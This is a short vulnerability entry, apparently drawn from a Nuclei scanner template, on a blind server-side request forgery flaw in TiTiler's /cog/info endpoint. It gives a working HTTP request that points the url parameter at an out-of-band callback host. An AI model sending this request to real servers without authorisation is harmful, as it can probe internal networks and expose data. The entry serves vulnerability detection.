# Vulnerability: TiTiler - Blind Server Side Request Forgery
**Classification:** CWE-918
**Source:** Nuclei Template (`titiler-ssrf.yaml`)

## Description
Blind SSRF vulnerability in TiTiler, a dynamic tile server for Cloud Optimized GeoTIFFs (COGs). The flaw lies in how the application handles the url parameter in the /cog/info endpoint, allowing attackers to make arbitrary internal or external HTTP requests.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /cog/info?url=http://{{interactsh-url}} HTTP/1.1
Host: {{Hostname}}
```

